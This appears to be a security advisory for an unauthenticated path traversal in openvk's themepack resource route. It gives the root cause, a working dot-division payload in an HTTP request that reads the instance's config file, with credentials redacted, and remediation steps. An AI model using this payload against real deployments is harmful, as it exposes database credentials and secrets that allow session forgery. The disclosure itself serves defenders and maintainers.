<!-- gist description (stage 6): openvk Path Traversal -->

# openvk Path Traversal

**CWE-22 · Unauthenticated path traversal / arbitrary file read · themepack resource endpoint, sanitizer bypass via dot-division reassembly**

> **Vendor:** OpenVK
> **Product:** openvk (open-source VKontakte-style social network, PHP / Chandler framework)
> **Affected version:** master branch, commit 8316cfc7eabf8426603f9b2a582d8396e8dc81b7 (2026-09-20)
> **Affected endpoints:** GET /themepack/{theme_id}/{version}/resource/{any} (Web/routes.yml:158-161, unauthenticated)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

The themepack static-resource route serves files from `<theme_home>/res/` using an attacker-controlled path that is sanitized only by `chandler_escape_url()` — a **single-pass** strip of literal `../` / `/..` sequences — applied by both the router and the presenter. A dot-division payload that reassembles into `../` after each pass survives both applications, and `Themepack::fetchResource()` performs no `realpath()`/containment check, so an unauthenticated guest can read arbitrary files readable by the PHP process. Verified end-to-end: `openvk.yml` (database credentials + 128-hex application secret) is disclosed in full.

## 2. Root Cause

| File:Line | Role |
|---|---|
| `Web/routes.yml:158-161` | route `/themepack/{text}/{?version}/{?resClass}/{?any}`, placeholder `any: ".+"` — depth unbounded |
| `Web/Presenters/ThemepacksPresenter.php:22` | `renderResource()` applies a second single-pass `chandler_escape_url($resource)`, then `$theme->fetchStaticResource(...)` |
| `Web/Themes/Themepack.php:87-113` | `fetchResource()`: `$file = "$this->home/$resource"` → `file_exists()` → `file_get_contents($file)` — no realpath/containment |
| Chandler `Router::execute()` | first `chandler_escape_url()` pass (strips `../`, `/..`, collapses `//`) |

```php
// Web/Presenters/ThemepacksPresenter.php (excerpt)
if ($resClass === "resource") {
    $data = $theme->fetchStaticResource(chandler_escape_url($resource)); // single-pass sanitizer
}

// Web/Themes/Themepack.php (excerpt)
public function fetchResource(string $resource, bool $processCSS = false): ?string
{
    $file = "$this->home/$resource";
    if (!file_exists($file)) { return null; }
    $result = file_get_contents($file);      // <-- no containment check
    ...
}
```

## 3. Prerequisites

- No authentication — the route is served to guests.
- Any installed **non-default** theme id (third-party theme ids are attacker-visible in page HTML; the built-in default id `ovk` is excluded by `Themepacks::offsetExists()`).
- Verified on Windows (officially supported deployment via `openvkctl.cmd`). The missing containment in `fetchResource()` is platform-independent code, but only Windows was tested end-to-end.

## 4. Reproduction

Control 1 — benign theme resource, works:

```http
GET /themepack/<installed_theme_id>/1.0./resource/<benign-res-file> HTTP/1.1
→ 200, correct content
```

Control 2 — naive forward-slash traversal is stripped by the sanitizer (single-pass `../` removal):

```http
GET /themepack/<installed_theme_id>/1.0./resource/../../../openvk.yml HTTP/1.1
→ 404 (climb collapsed)
```

Working exploit — dot-division reassembly crafted to survive BOTH single-pass sanitizers (router pass and presenter pass); note the **non-numeric** version segment `1.0.` (numeric segments are int-cast by chandler and `renderResource(string $version)` then TypeErrors):

```http
GET /themepack/<installed_theme_id>/1.0./resource/./...../../././../././....././././....../../././openvk.yml HTTP/1.1

router pass   → any = .../././..././...././openvk.yml
presenter pass → res/../../../openvk.yml → OPENVK_ROOT/openvk.yml

HTTP/1.1 200 OK
chandler:
    ...
preferences:
    ...
database:
    dsn: "mysql:host=127.0.0.1;port=3307;dbname=openvk"
    user: "<REDACTED>"
    password: "<REDACTED>"
[... full openvk.yml returned, including database credentials and the
     128-hex-character security secret — values REDACTED ...]
```

(cURL users: pass `--path-as-is` so the client does not normalize the dot segments.)

Notes from runtime verification:

1. Traversal depth from `themepacks/<id>/res/` to `OPENVK_ROOT` is **3** (`../` × 3).
2. Backslash payloads (`\..\..\`) do NOT survive modern Windows front servers — php -S, nginx for Windows and Apache for Windows all fold backslashes to forward slashes before the sanitizer strips the resulting `/../` (probed for all three). The dot-division reassembly above is the reliable vector.
3. Depth is unbounded (`any: ".+"`): any file readable by the PHP process can be exfiltrated the same way.

## 5. Confirmed Techniques

- Full openvk install (Apache httpd 2.4 + mod_fcgid + php-cgi 8.4, MySQL) on Windows; unauthenticated GET returned `OPENVK_ROOT/openvk.yml` verbatim including DB credentials and the 128-hex security secret (`<REDACTED>`).
- Front-server matrix probed for the backslash variant (php -S / nginx / Apache on Windows) — all fold backslashes; dot-division payload works through all of them.
- Only environment deviation from pristine source: `ovk-init.php` no longer requires ext-imagick (no Windows DLL for PHP 8.4; the tested endpoint never uses Imagick).

## 6. Impact

- Unauthenticated arbitrary file read (any file readable by the PHP process; depth unbounded).
- `openvk.yml` alone discloses database credentials (direct DB access to the instance's data) and the instance-wide application secret used for CSRF tokens, session signing and captcha encryption — enabling session/CSRF forging (`<REDACTED>` values, existence/format preserved as evidence above).

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N` (Base 5.9, Medium — AC:H reflects the deployment-specific path confirmed in testing)

## 8. Remediation

1. In `Themepack::fetchResource()`, resolve with `realpath()` and require the resolved path to be inside `$this->home`.
2. In `ThemepacksPresenter::renderResource()`, reject any resource segment containing `\` or `..` outright, instead of relying on the single-pass `chandler_escape_url()` strip.
3. Consider serving theme statics from a fixed allow-list per theme manifest.

## 9. References

- Project: https://github.com/OpenVK/openvk
- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- External disclosure: https://gist.github.com/qianqiusujiu/893e5d90187fcd023ce8ca6acba43a64
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
